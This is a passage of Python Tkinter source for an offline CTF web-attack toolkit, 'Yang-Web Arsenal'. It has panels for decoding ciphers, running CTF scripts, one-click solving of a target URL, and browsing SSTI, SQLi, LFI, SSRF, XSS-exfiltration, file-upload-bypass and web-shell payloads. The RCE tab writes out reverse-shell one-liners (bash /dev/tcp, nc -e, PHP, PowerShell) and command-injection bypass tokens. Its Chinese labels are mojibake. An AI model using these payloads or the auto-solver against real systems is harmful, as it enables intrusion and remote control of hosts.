            lines.append("ç¶æ: æ¯æç¼ç /è§£ç ")
        else:
            lines.append("ç¶æ: ä»æä¾åèå¾/è¯´æ")
        self.info_var.set("\n".join(lines))

        # Show reference: image button + text content
        img = get_image_path(cid)
        img2 = get_image2_path(cid)
        self._current_image_path = img if img else ""
        self._current_image2_path = img2 if img2 else ""

        if img:
            self.view_img_btn.configure(state="normal", bg=INPUT_BG, fg=ACCENT)
            self.img_path_var.set(os.path.basename(img))
            self.view_img_btn.pack(side=tk.LEFT, padx=(8, 0))
        else:
            self.view_img_btn.pack_forget()

        if img2:
            self.view_img2_btn.configure(state="normal")
            self.view_img2_btn.pack(side=tk.LEFT, padx=4)
        else:
            self.view_img2_btn.pack_forget()

        if not img and not img2:
            self.img_path_var.set("")

        # Load and show text content
        _clear_output(self.ref_text)
        txt_content = get_text_content(cid)
        if txt_content:
            _append(self.ref_text, txt_content)
        elif not img and not img2:
            # No image, no text â show algorithm note
            _append(self.ref_text, "[æ­¤å¯ç ä¸ºç»å¸ç®æ³ï¼æ éåèå¾/è¯´ææä»¶]")
        else:
            tips = []
            if img:
                tips.append("æ¥çåå¾")
            if img2:
                tips.append("å¾2")
            _append(self.ref_text, f"[ç¹å» {', '.join(tips)} æé®æ¥çåèå¾ç]")

        # Store selected cipher id
        self._selected_cid = cid

    def _clear_detail(self):
        self.info_var.set("")
        self.img_path_var.set("")
        self.view_img_btn.pack_forget()
        self.view_img2_btn.pack_forget()
        _clear_output(self.ref_text)
        self._selected_cid = None
        self._current_image_path = ""
        self._current_image2_path = ""

    def _open_image(self):
        """Open reference image with system viewer."""
        if self._current_image_path and os.path.exists(self._current_image_path):
            try:
                os.startfile(self._current_image_path)
            except Exception as e:
                _clear_output(self.ref_text)
                _append(self.ref_text, "æ æ³æå¼å¾ç: " + str(e))

    def _open_image2(self):
        """Open second reference image."""
        if self._current_image2_path and os.path.exists(self._current_image2_path):
            try:
                os.startfile(self._current_image2_path)
            except Exception as e:
                _clear_output(self.ref_text)
                _append(self.ref_text, "æ æ³æå¼å¾ç: " + str(e))

    def _do_encode(self):
        text = self.io_entry.get().strip()
        cid = self._selected_cid
        if not cid:
            _clear_output(self.output)
            _append(self.output, "â  è¯·åéæ©å¯ç ç±»å")
            return
        if not text:
            _clear_output(self.output)
            _append(self.output, "â  è¯·è¾å¥ææ¬")
            return
        key = self.key_entry.get().strip()
        _clear_output(self.output)
        try:
            result = mc_encode(cid, text, key=key)
            _append(self.output, "ð " + cid + " ç¼ç :\n" + result)
        except Exception as e:
            _append(self.output, "â éè¯¯: " + str(e))

    def _do_decode(self):
        text = self.io_entry.get().strip()
        cid = self._selected_cid
        if not cid:
            _clear_output(self.output)
            _append(self.output, "â  è¯·åéæ©å¯ç ç±»å")
            return
        if not text:
            _clear_output(self.output)
            _append(self.output, "â  è¯·è¾å¥ææ¬")
            return
        key = self.key_entry.get().strip()
        _clear_output(self.output)
        try:
            result = mc_decode(cid, text, key=key)
            _append(self.output, "ð " + cid + " è§£ç :\n" + result)
        except Exception as e:
            _append(self.output, "â éè¯¯: " + str(e))


class ScriptsPanel(tk.Frame):
    """CTF scripts panel with dependency management."""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "CTF Scripts", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "D:\\CTF 41 scripts + dep management + Web Solver", fg=YELLOW, font_size=9)

        # Solve bar â input URL, one-click attack
        solve_bar = tk.Frame(self, bg=DARK)
        solve_bar.pack(fill=tk.X, padx=4, pady=(4, 0))
        tk.Label(solve_bar, text="Target:", bg=DARK, fg=ACCENT,
                 font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(8, 4))
        self.url_entry = tk.Entry(solve_bar, bg=INPUT_BG, fg=FG,
                                   insertbackground=ACCENT, relief="flat",
                                   font=("Cascadia Code", 10),
                                   width=50)
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)
        self.url_entry.insert(0, "http://")
        self.solve_btn = tk.Button(solve_bar, text="Solve", command=self._solve_url,
                                    bg=ACCENT, fg=DARK, activebackground=GREEN,
                                    relief="flat", padx=16, pady=3, cursor="hand2",
                                    font=("Microsoft YaHei UI", 10, "bold"))
        self.solve_btn.pack(side=tk.LEFT, padx=(4, 8))

        # Search bar + dep buttons
        top_bar = tk.Frame(self, bg=BG)
        top_bar.pack(fill=tk.X, pady=(8, 4), padx=4)
        tk.Label(top_bar, text="Search", bg=BG, fg=ACCENT,
                 font=("Microsoft YaHei UI", 12)).pack(side=tk.LEFT)
        self.search_entry = tk.Entry(top_bar, bg=INPUT_BG, fg=FG,
                                      insertbackground=ACCENT, relief="flat",
                                      font=("Cascadia Code", 11), width=25)
        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=8, ipady=4)
        self.search_entry.bind("<KeyRelease>", self._do_search)
        tk.Button(top_bar, text="Check Deps", command=self._check_deps,
                  bg=INPUT_BG, fg=YELLOW, activebackground=ACCENT, relief="flat",
                  padx=10, pady=4, cursor="hand2",
                  font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=2)
        tk.Button(top_bar, text="Install All", command=self._install_all_deps,
                  bg=INPUT_BG, fg=GREEN, activebackground=ACCENT, relief="flat",
                  padx=10, pady=4, cursor="hand2",
                  font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=2)

        cat_frame = tk.Frame(self, bg=BG)
        cat_frame.pack(fill=tk.X, pady=4, padx=4)
        self.cat_buttons = {}
        for cat_key, cat_label in [("all", "All"), ("crypto", "Crypto"),
                                    ("web", "Web"), ("reverse", "Reverse"),
                                    ("misc", "Misc")]:
            btn = tk.Button(cat_frame, text=cat_label, relief="flat",
                           bg=INPUT_BG, fg=FG, activebackground=ACCENT,
                           activeforeground=DARK, padx=12, pady=4,
                           cursor="hand2", font=("Microsoft YaHei UI", 9),
                           command=lambda c=cat_key: self._filter_cat(c))
            btn.pack(side=tk.LEFT, padx=2)
            self.cat_buttons[cat_key] = btn
        self.dep_status_label = tk.Label(cat_frame, text="", bg=BG, fg=YELLOW,
                                          font=("Microsoft YaHei UI", 8))
        self.dep_status_label.pack(side=tk.RIGHT, padx=8)

        panes = tk.PanedWindow(self, bg=BG, sashwidth=3)
        panes.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

        list_frame = tk.Frame(panes, bg=BG)
        panes.add(list_frame, width=340)
        _label(list_frame, "Scripts:", pady=4)
        self.script_list = tk.Listbox(list_frame, bg=INPUT_BG, fg=FG,
                                       selectbackground=ACCENT,
                                       selectforeground=DARK,
                                       relief="flat", borderwidth=0,
                                       font=("Microsoft YaHei UI", 10),
                                       height=20)
        self.script_list.pack(fill=tk.BOTH, expand=True, pady=(0, 4))
        self.script_list.bind("<<ListboxSelect>>", self._on_select)

        detail_frame = tk.Frame(panes, bg=BG)
        panes.add(detail_frame, width=580)
        _label(detail_frame, "Details:", pady=4)
        self.detail_frame, self.detail_output = _output_area(detail_frame, 18)
        self.detail_frame.pack(fill=tk.BOTH, expand=True)

        btn_bar = tk.Frame(detail_frame, bg=BG)
        btn_bar.pack(fill=tk.X, pady=4)
        tk.Button(btn_bar, text="Run", command=self._run_selected,
                  bg=GREEN, fg=DARK, activebackground=ACCENT, relief="flat",
                  padx=20, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 11, "bold")).pack(side=tk.LEFT, padx=(0, 8))
        self.install_btn = tk.Button(btn_bar, text="Install Script Deps",
                                      command=self._install_script_deps,
                                      bg=INPUT_BG, fg=YELLOW, activebackground=ACCENT,
                                      relief="flat", padx=12, pady=6, cursor="hand2",
                                      font=("Microsoft YaHei UI", 10))
        self.install_btn.pack(side=tk.LEFT, padx=(0, 8))
        self.install_btn.pack_forget()
        tk.Button(btn_bar, text="Clear", command=lambda: _clear_output(self.detail_output),
                  bg=RED, fg=DARK, activebackground="#ff6b6b", relief="flat",
                  padx=16, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT)

        self._all_scripts = []
        self._current_key = None
        self._dep_status = {}
        self._populate_list()

    def _populate_list(self, category=None, query=None):
        self.script_list.delete(0, tk.END)
        self._all_scripts = []
        try:
            from .scripts.registry import SCRIPTS, CATEGORIES
            from .scripts.deps import check_dep
            for key, meta in sorted(SCRIPTS.items(), key=lambda x: x[0]):
                if category and category != "all" and meta["category"] != category:
                    continue
                if query and query.lower() not in key.lower() and query.lower() not in meta["title"].lower() and query.lower() not in meta["description"].lower():
                    continue
                cat_icon = CATEGORIES.get(meta["category"], "?")
                if meta["deps"]:
                    all_ok = all(check_dep(d) for d in meta["deps"])
                    dep_icon = " [OK]" if all_ok else " [MISS]"
                else:
                    dep_icon = ""
                display = cat_icon + " " + meta['title'] + dep_icon
                self.script_list.insert(tk.END, display)
                self._all_scripts.append((key, meta))
        except Exception as e:
            self.script_list.insert(tk.END, "err: " + str(e))

    def _filter_cat(self, cat):
        for k, btn in self.cat_buttons.items():
            if k == cat:
                btn.configure(bg=ACCENT, fg=DARK)
            else:
                btn.configure(bg=INPUT_BG, fg=FG)
        self._populate_list(category=cat)

    def _do_search(self, event):
        q = self.search_entry.get().strip()
        self._populate_list(query=q if q else None)

    def _on_select(self, event):
        sel = self.script_list.curselection()
        if not sel:
            return
        idx = sel[0]
        if idx >= len(self._all_scripts):
            return
        key, meta = self._all_scripts[idx]
        self._current_key = key
        _clear_output(self.detail_output)
        _append(self.detail_output, "title: " + meta['title'] + "\n")
        _append(self.detail_output, "=" * 50 + "\n")
        _append(self.detail_output, "category: " + meta['category'] + "\n")
        _append(self.detail_output, "desc: " + meta['description'] + "\n")
        _append(self.detail_output, "usage: " + meta['usage'] + "\n")
        _append(self.detail_output, "input: " + meta['input_type'] + " -> output: " + meta['output_type'] + "\n")
        if meta["deps"]:
            from .scripts.deps import check_dep
            _append(self.detail_output, "\ndep status:\n")
            all_ok = True
            for d in meta["deps"]:
                ok = check_dep(d)
                icon = "  ok" if ok else "  MISS"
                _append(self.detail_output, icon + " " + d + "\n")
                if not ok:
                    all_ok = False
            if all_ok:
                self.install_btn.pack_forget()
            else:
                self.install_btn.pack(side=tk.LEFT, padx=(0, 8))
        else:
            _append(self.detail_output, "\nzero deps\n")
            self.install_btn.pack_forget()

    def _run_selected(self):
        if not self._current_key:
            _clear_output(self.detail_output)
            _append(self.detail_output, "select a script first")
            return
        try:
            from .scripts.runner import run_script as _run
            meta = None
            for k, m in self._all_scripts:
                if k == self._current_key:
                    meta = m
                    break
            _clear_output(self.detail_output)
            title = meta['title'] if meta else self._current_key
            _append(self.detail_output, "running: " + title + "\n")
            _append(self.detail_output, "=" * 50 + "\n\n")
            result = _run(self._current_key)
            if result["stdout"]:
                _append(self.detail_output, result["stdout"])
            if result["stderr"]:
                _append(self.detail_output, "\nerr:\n" + result['stderr'])
            if result["success"]:
                _append(self.detail_output, "\n" + "=" * 50 + "\nOK")
            else:
                _append(self.detail_output, "\n" + "=" * 50 + "\nFAIL code=" + str(result['exit_code']))
        except Exception as e:
            _clear_output(self.detail_output)
            _append(self.detail_output, "error: " + str(e))

    def _check_deps(self):
        _clear_output(self.detail_output)
        _append(self.detail_output, "checking deps...\n")
        _append(self.detail_output, "=" * 50 + "\n\n")
        try:
            from .scripts.deps import check_all_deps
            status = check_all_deps()
            if not status:
                _append(self.detail_output, "all zero-dependency\n")
                self.dep_status_label.configure(text="all zero-deps", fg=GREEN)
                return
            total = 0
            missing = 0
            for key, info in status.items():
                ok = "OK" if info["all_ok"] else "MISS"
                _append(self.detail_output, ok + " " + info['meta']['title'] + "\n")
                total += 1
                for d in info["deps"]:
                    icon = "    ok" if d["installed"] else "    MISS"
                    _append(self.detail_output, icon + " " + d['name'] + "\n")
                if not info["all_ok"]:
                    missing += 1
                _append(self.detail_output, "\n")
            if missing == 0:
                _append(self.detail_output, "\nall " + str(total) + " OK")
                self.dep_status_label.configure(text="all " + str(total) + " OK", fg=GREEN)
            else:
                _append(self.detail_output, "\n" + str(missing) + "/" + str(total) + " MISS")
                self.dep_status_label.configure(text=str(missing) + "/" + str(total) + " MISS", fg=YELLOW)
        except Exception as e:
            _append(self.detail_output, "check failed: " + str(e))

    def _install_all_deps(self):
        _clear_output(self.detail_output)
        _append(self.detail_output, "installing missing deps...\n")
        _append(self.detail_output, "=" * 50 + "\n\n")
        import threading
        def run():
            try:
                from .scripts.deps import get_missing_deps, install_all_missing
                missing = get_missing_deps()
                if not missing:
                    _append(self.detail_output, "all installed\n")
                    self.dep_status_label.configure(text="all installed", fg=GREEN)
                    return
                pkgs = ", ".join(sorted(missing))
                _append(self.detail_output, "installing " + str(len(missing)) + ": " + pkgs + "\n\n")
                _append(self.detail_output, "please wait... pip is running\n")
                results = install_all_missing()
                ok_count = 0
                for r in results:
                    icon = "OK" if r["success"] else "FAIL"
                    msg = r['message']
                    if isinstance(msg, bytes):
                        msg = msg.decode('utf-8', errors='replace')
                    _append(self.detail_output, icon + " " + r['dep'] + ": " + msg + "\n")
                    if r["success"]:
                        ok_count += 1
                _append(self.detail_output, "\n" + "=" * 50 + "\n")
                if ok_count == len(results):
                    _append(self.detail_output, "all " + str(ok_count) + " installed")
                    self.dep_status_label.configure(text="all installed", fg=GREEN)
                else:
                    _append(self.detail_output, str(ok_count) + "/" + str(len(results)) + " OK")
                self._populate_list()
            except Exception as e:
                _append(self.detail_output, "install failed: " + str(e))
        t = threading.Thread(target=run, daemon=True)
        t.start()

    def _install_script_deps(self):
        if not self._current_key:
            return
        try:
            from .scripts.deps import install_deps_for_script
            from .scripts.registry import get_script
            meta = get_script(self._current_key)
            if not meta or not meta["deps"]:
                return
            _clear_output(self.detail_output)
            _append(self.detail_output, "installing '" + meta['title'] + "' deps: " + ", ".join(meta['deps']) + "\n")
            _append(self.detail_output, "=" * 50 + "\n\n")
            _append(self.detail_output, "please wait... pip is running\n")
        except Exception as e:
            _append(self.detail_output, "prep error: " + str(e))
            return
        import threading
        def run():
            try:
                from .scripts.deps import install_deps_for_script
                results = install_deps_for_script(self._current_key)
                ok_count = 0
                for r in results:
                    icon = "OK" if r["success"] else "FAIL"
                    msg = r['message']
                    if isinstance(msg, bytes):
                        msg = msg.decode('utf-8', errors='replace')
                    _append(self.detail_output, icon + " " + r['dep'] + ": " + msg + "\n")
                    if r["success"]:
                        ok_count += 1
                _append(self.detail_output, "\n" + "=" * 50 + "\n")
                if ok_count == len(results):
                    _append(self.detail_output, "done, ready to run")
                sel = self.script_list.curselection()
                if sel:
                    self._on_select(None)
                self._populate_list()
            except Exception as e:
                _append(self.detail_output, "install failed: " + str(e))
        t = threading.Thread(target=run, daemon=True)
        t.start()

    def _solve_url(self):
        url = self.url_entry.get().strip()
        if not url or url == "http://":
            _clear_output(self.detail_output)
            _append(self.detail_output, "Enter a target URL and click Solve\n")
            return
        self.solve_btn.configure(text="Running...", state="disabled", bg=RED)
        _clear_output(self.detail_output)
        _append(self.detail_output, "Target: " + url + "\n")
        _append(self.detail_output, "=" * 50 + "\n\n")
        import threading
        def run():
            try:
                from .scripts.solver import solve_web
                def progress(step, status, detail):
                    if status == "flag!":
                        _append(self.detail_output, "\nFLAG: " + detail + "\n")
                    elif status == "running":
                        _append(self.detail_output, step + " " + detail + "\n")
                    else:
                        s = "> " if status == "ok" else "x "
                        _append(self.detail_output, s + step + ": " + detail + "\n")
                result = solve_web(url, progress_callback=progress)
                _append(self.detail_output, "\n" + "=" * 50 + "\n")
                if result["flag"]:
                    _append(self.detail_output, "FLAG: " + result["flag"] + "\n")
                else:
                    _append(self.detail_output, "No flag found - try other tabs or manual scripts\n")
            except Exception as e:
                _append(self.detail_output, "Error: " + str(e) + "\n")
            self.solve_btn.configure(text="Solve", state="normal", bg=ACCENT)
        t = threading.Thread(target=run, daemon=True)
        t.start()

def _pretty_json(obj):
    import json
    return json.dumps(obj, indent=2, ensure_ascii=False)


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  ä¸»çªå£
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

def run_gui():
    root = tk.Tk()
    root.title("Yang-Web Arsenal â ç¦»çº¿ CTF Web å·¥å·ç®±")
    root.geometry("1100x720")
    root.minsize(900, 600)
    apply_theme(root)

    # ââ ç¶æ: gui è¿æ¯ cli ââ
    mode = {"current": "gui"}

    # ââ é¡¶é¨æ é¢æ  ââ
    header = tk.Frame(root, bg=DARK, height=52)
    header.pack(fill=tk.X)
    header.pack_propagate(False)
    tk.Label(header, text="ð§  Yang-Web", bg=DARK, fg=ACCENT,
             font=("Cascadia Code", 16, "bold")).pack(side=tk.LEFT, padx=20, pady=10)

    mode_label = tk.Label(header, text="ç¦»çº¿ CTF Web çå£«åå  Â·  15 ä¸ªæ¨¡å + 41 ååµèæ¬",
             bg=DARK, fg=YELLOW, font=("Microsoft YaHei UI", 9))
    mode_label.pack(side=tk.LEFT, pady=14)

    # ââ åæ¢æé® ââ
    toggle_btn = tk.Button(header, text="ð» CLI",
                           bg=INPUT_BG, fg=ACCENT, relief="flat", borderwidth=1,
                           padx=14, pady=4, cursor="hand2",
                           font=("Microsoft YaHei UI", 9, "bold"),
                           activebackground=BORDER, activeforeground=ACCENT)
    toggle_btn.pack(side=tk.RIGHT, padx=16, pady=10)

    # ââ åå®¹å®¹å¨ ââ
    content = tk.Frame(root, bg=BG)
    content.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

    # GUI æ¨¡å¼ â Notebook
    gui_frame = tk.Frame(content, bg=BG)
    notebook = ttk.Notebook(gui_frame)
    notebook.pack(fill=tk.BOTH, expand=True)

    # è§£ç 
    decode_panel = DecodePanel(notebook)
    notebook.add(decode_panel, text=" ð è§£ç  ")

    # Payload é¢æ¿ä»¬
    def _add_payload_tab(title, emoji, get_fn, categories=None, search_fn=None, analyzer_fn=None):
        """Add a payload tab with optional category dropdown."""
        panel = PayloadPanel(notebook, title, emoji, get_fn, search_fn, analyzer_fn)
        if categories:
            panel.set_categories(categories)
        notebook.add(panel, text=f" {emoji} {title} ")
        return panel

    _add_payload_tab("SSTI", "ð¨", ssti.get_exploit,
                     categories=list(ssti.EXPLOIT.keys()))
    _add_payload_tab("SQLi", "ðï¸", sqli.get_exploit,
                     categories=list(sqli.EXPLOIT.keys()),
                     search_fn=sqli.search_payload)

    # ââ LFI ââ
    def _lfi_get(cat):
        data = {
            "è·¯å¾éå": {"è·¯å¾éåPayload": lfi.get_path_traversal()},
            "æææä»¶(Linux)": lfi.get_sensitive_files("Linux"),
            "æææä»¶(Windows)": lfi.get_sensitive_files("Windows"),
            "PHPä¼ªåè®®": lfi.get_php_wrappers(),
        }
        return data if not cat or cat == "å¨é¨" else {cat: data.get(cat, [])}
    _add_payload_tab("LFI", "ð", _lfi_get,
                     categories=["è·¯å¾éå", "æææä»¶(Linux)", "æææä»¶(Windows)", "PHPä¼ªåè®®"])

    # ââ SSRF ââ
    def _ssrf_get(cat):
        data = {
            "äºåæ°æ®": ssrf.get_cloud_metadata(),
            "ç»è¿æå·§": {"SSRF Bypass": ssrf.get_bypass()},
            "å¸¸è§ç«¯å£": ssrf.get_common_ports(),
            "åç½å°å": {"åç½IPæ®µ": ssrf.get_internal_ranges()},
        }
        return data if not cat or cat == "å¨é¨" else {cat: data.get(cat, [])}
    _add_payload_tab("SSRF", "ð", _ssrf_get,
                     categories=["äºåæ°æ®", "ç»è¿æå·§", "å¸¸è§ç«¯å£", "åç½å°å"])

    # ââ XSS ââ
    def _xss_get(cat):
        data = {
            "æ£æµPayload": {"XSSæ£æµ": xss.get_detection()},
            "æ°æ®å¤ä¼ ": {"Exfiltration": xss.get_exfiltration()},
            "WAFç»è¿": xss.get_bypass(),
        }
        return data if not cat or cat == "å¨é¨" else {cat: data.get(cat, [])}
    _add_payload_tab("XSS", "ð", _xss_get,
                     categories=["æ£æµPayload", "æ°æ®å¤ä¼ ", "WAFç»è¿"])

    # ââ PHP ââ
    def _php_get(cat):
        data = {
            "Magic Hash": {"MD5(0e...)": php.MAGIC_HASHES.get("MD5 (0e...)", [])[:15]},
            "å¼±ç±»åæ¯è¾": {k: [i.get("example", str(i)) for i in v]
                        for k, v in php.TYPE_JUGGLING.items()},
            "RCE Bypass": {"å¸¸è§ç»è¿": php.PHP_RCE_BYPASS.get("å¸¸è§å½ä»¤æ§è¡å½æ°", [])[:15]},
        }
        return data if not cat or cat == "å¨é¨" else {cat: data.get(cat, [])}
    _add_payload_tab("PHP", "ð", _php_get,
                     categories=["Magic Hash", "å¼±ç±»åæ¯è¾", "RCE Bypass"])

    # ââ Upload ââ
    def _upload_get(cat):
        """Get upload payloads, filtered by category."""
        ext_sections = {}
        for k, v in upload.EXT_BYPASS.items():
            ext_sections[k] = v
        mime_items = []
        for k, v in upload.MIME_HEADER_FAKE.items():
            mime_items.append(f"{k}: Content-Type={v['Content-Type']}  |  æä»¶å¤´={v['æä»¶å¤´hex']}")
        content_sections = {}
        for k, v in upload.CONTENT_BYPASS.items():
            content_sections[k] = v
        all_data = {
            "åç¼ç»è¿": ext_sections,
            "å¤§å°åæ··æ·": {"å¤§å°åæ··å": upload.EXT_BYPASS.get("å¤§å°åæ··å", [])},
            "å¤åç¼ç»å": {"å¤åç¼ç»å": upload.EXT_BYPASS.get("å¤åç¼ç»å", [])},
            "NTFS & ç©ºæ ¼ç¹": {
                "NTFS æ°æ®æµ": upload.EXT_BYPASS.get("NTFS æ°æ®æµ (Win)", []),
                "ç©ºæ ¼/ç¹æå·§": upload.EXT_BYPASS.get("ç©ºæ ¼/ç¹æå·§ (Win)", []),
            },
            "è·¯å¾æªæ­": {"è·¯å¾æªæ­": upload.EXT_BYPASS.get("è·¯å¾æªæ­", [])},
            "MIMEä¼ªé ": {"Content-Type & æä»¶å¤´": mime_items},
            "å¾çé©¬åå®¹ç»è¿": content_sections,
            "ä¸å¥è¯æ¨é©¬": {
                "evalç": [upload.generate_image_shell("eval")],
                "systemç": [upload.generate_image_shell("system")],
                "æç®ç": [upload.generate_image_shell("one_liner")],
            },
            ".htaccess/.user.ini": {
                ".htaccess": [upload.generate_htaccess()],
                ".user.ini": [upload.generate_userini(), upload.generate_userini("shell.jpg")],
            },
            "é«çº§æå·§": {},
        }
        try:
            if hasattr(upload, 'ADVANCED_BYPASS'):
                all_data["é«çº§æå·§"] = upload.ADVANCED_BYPASS
        except Exception:
            pass
        try:
            if hasattr(upload, 'get_parse_vuln'):
                all_data["è§£ææ¼æ´"] = upload.get_parse_vuln()
        except Exception:
            pass
        return all_data if not cat or cat == "å¨é¨" else {cat: all_data.get(cat, {})}
    def _upload_analyze(blacklist_str):
        """GUI é¶åºé»åååæ."""
        import re
        ALL_EXTS = {'php','php3','php4','php5','php7','php8','phtml','pht','phps','phar','shtml','cgi'}
        blocked = set(re.findall(r'[a-zA-Z0-9]+', blacklist_str.lower()))
        
        lines = []
        lines.append(f"ð¯ é¶åºé»åååæ")
        lines.append(f"  å·²æ¦æª: {', '.join(sorted(blocked))}")
        
        safe = sorted(ALL_EXTS - blocked)
        if safe:
            lines.append(f"")
            lines.append(f"â å¯ç¨åç¼ (ä¸å¨é»åå):")
            for ext in safe:
                marker = " â­æ¨è" if ext in ('pht','phtml') else ""
                lines.append(f"  â¢ .{ext}{marker}")
        else:
            lines.append(f"\nâ ææå¸¸è§åç¼åå¨é»ååä¸­")
        
        lines.append(f"")
        lines.append(f"ð¤ å¤§å°åæ··åç­ç¥:")
        for v in ['Php','pHp','PHP','pHp5','PhP']:
            ext = v.lower()
            tag = "â" if ext in blocked else "âª"
            lines.append(f"  {tag} {v}")
        
        lines.append(f"")
        lines.append(f"ð¦ å¶ä»ç»è¿:")
        lines.append(f"  â¢ ååç¼: shell.php.jpg")
        lines.append(f"  â¢ NTFSæ°æ®æµ: shell.php::$DATA")
        lines.append(f"  â¢ ç©ºæ ¼/ç¹: shell.php .  (Windows)")
        
        return '\n'.join(lines)

    _add_payload_tab("Upload", "ð¤", _upload_get,
                     categories=["åç¼ç»è¿", "å¤§å°åæ··æ·", "å¤åç¼ç»å", "NTFS & ç©ºæ ¼ç¹",
                                  "è·¯å¾æªæ­", "MIMEä¼ªé ", "å¾çé©¬åå®¹ç»è¿", "ä¸å¥è¯æ¨é©¬",
                                  ".htaccess/.user.ini", "è§£ææ¼æ´", "é«çº§æå·§"],
                     analyzer_fn=_upload_analyze)

    # ââ RCE ââ
    def _rce_get(cat):
        data = {
            "åå¼¹Shell": {"åè¯­è¨åå¼¹Shell": [
                "bash -i >& /dev/tcp/IP/PORT 0>&1",
                "nc -e /bin/sh IP PORT",
                "python3 -c 'import socket,subprocess,os;s=socket.socket();...'",
                "php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('IP',PORT)...\"",
            ]},
            "å½ä»¤æ³¨å¥é¾æ¥ç¬¦": {"é¾æ¥ç¬¦": [";", "|", "||", "&&", "&", "%0a", "`", "$(cmd)"]},
            "ç©ºæ ¼ç»è¿": {"ç»è¿æå·§": ["${IFS}", "$IFS$9", "<>", "{ls,-la}", "%09", "%20"]},
            "å³é®å­ç»è¿": {"ç»è¿æå·§": ["c''at", "c\\at", "ca$*t", "/???/c?t", "c'a't"]},
        }
        return data if not cat or cat == "å¨é¨" else {cat: data.get(cat, [])}
    _add_payload_tab("RCE", "ð»", _rce_get,
                     categories=["åå¼¹Shell", "å½ä»¤æ³¨å¥é¾æ¥ç¬¦", "ç©ºæ ¼ç»è¿", "å³é®å­ç»è¿"])

    # Hash
    notebook.add(HashPanel(notebook), text=" ð Hash ")

    # JWT
    notebook.add(JWTPanel(notebook), text=" ð JWT ")

    # Scripts â ååµ CTF èæ¬åº
    notebook.add(ScriptsPanel(notebook), text=" ð¦ èæ¬åº ")

    # Misc Crypto â 20+ common cipher types
    notebook.add(MiscCryptoPanel(notebook), text=" ð Misc Crypto ")

    # ââ CLI æ¨¡å¼ â ç»ç«¯é¢æ¿ (åå§éè) ââ
    cli_frame = tk.Frame(content, bg=DARK)

    # ç»ç«¯è¾åºåº
    cli_output_frame, cli_output = _output_area(cli_frame, 30)
    cli_output_frame.pack(fill=tk.BOTH, expand=True, padx=6, pady=(6, 0))
    cli_output.configure(bg=DARK, fg=GREEN, font=("Cascadia Code", 10),
                         insertbackground=GREEN)

    # åºé¨è¾å¥è¡
    input_bar = tk.Frame(cli_frame, bg=DARK, height=34)
    input_bar.pack(fill=tk.X, padx=6, pady=6)
    input_bar.pack_propagate(False)

    prompt_label = tk.Label(input_bar, text=">>>", bg=DARK, fg=YELLOW,
                            font=("Cascadia Code", 11, "bold"))
    prompt_label.pack(side=tk.LEFT, padx=(6, 2), pady=4)

    cli_entry = tk.Entry(input_bar, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
                         relief="flat", borderwidth=0,
                         font=("Cascadia Code", 11))
    cli_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=3, padx=(2, 6))

    # ââ CLI åå²ä¸å½ä»¤æ§è¡ ââ
    import io
    from .cli import main as cli_main

    cli_history = []
    history_idx = [0]

    def _run_cli_cmd(cmd_text):
        _append(cli_output, f"{'>'*3} {cmd_text}", "input")

        if not cmd_text.strip():
            return

        cli_history.append(cmd_text)
        history_idx[0] = len(cli_history)

        # åç½®å½ä»¤
        if cmd_text.strip().lower() in ("clear", "cls"):
            _clear_output(cli_output)
            return
        if cmd_text.strip().lower() in ("help", "-h", "--help"):
            _append(cli_output, """
  Commands (same as CLI):
    decode BASE64 <text>       decode <text>           hashid <hash>
    encode BASE64 <text>       encode <text>           jwt <token>
    ssti python <tpl>          ssti <engine> <tpl>     scripts --run <name>
    sqli mysql <payload>       sqli <db> <payload>     scripts --search <kw>
    lfi <target>               lfi <path>              solve <url>
    ssrf <target>              ssrf <url>              scan dirs|files
    xss <target>               xss <context>           misc (å¯ç ç¥è¯åº)
    rce <target>               rce <cmd>               clear, help, exit
    php <payload>               php <type>
  Tip: prefix all CLI-style args as-is, e.g.  scripts --run 'rsa_toolkit'
""")
            return
        if cmd_text.strip().lower() in ("exit", "quit"):
            return  # handled by toggle

        # Capture stdout
        old_stdout = sys.stdout
        old_stderr = sys.stderr
        buf = io.StringIO()
        sys.stdout = buf
        sys.stderr = buf

        try:
            # æååæ° (å¤çå¼å·)
            import shlex
            try:
                args = shlex.split(cmd_text)
            except ValueError:
                args = cmd_text.split()

            sys.argv = ["yang_web"] + args
            try:
                cli_main()
            except SystemExit:
                pass

            out = buf.getvalue()
            if out.strip():
                for line in out.rstrip().split("\n"):
                    _append(cli_output, line)
            else:
                _append(cli_output, "(ok)")
        except Exception as e:
            _append(cli_output, f"Error: {e}")
        finally:
            sys.stdout = old_stdout
            sys.stderr = old_stderr
            buf.close()

    def _on_cli_enter(event):
        cmd = cli_entry.get().strip()
        if cmd.lower() in ("exit", "quit"):
            cli_entry.delete(0, tk.END)
            _toggle_mode()
            return
        _run_cli_cmd(cmd)
        cli_entry.delete(0, tk.END)

    def _on_cli_up(event):
        if not cli_history:
            return "break"
        if history_idx[0] > 0:
            history_idx[0] -= 1
        cli_entry.delete(0, tk.END)
        cli_entry.insert(0, cli_history[history_idx[0]])
        return "break"

    def _on_cli_down(event):
        if not cli_history:
            return "break"
        if history_idx[0] < len(cli_history) - 1:
            history_idx[0] += 1
            cli_entry.delete(0, tk.END)
            cli_entry.insert(0, cli_history[history_idx[0]])
        else:
            history_idx[0] = len(cli_history)
            cli_entry.delete(0, tk.END)
        return "break"

    cli_entry.bind("<Return>", _on_cli_enter)
    cli_entry.bind("<Up>", _on_cli_up)
    cli_entry.bind("<Down>", _on_cli_down)

    def _show_cli_welcome():
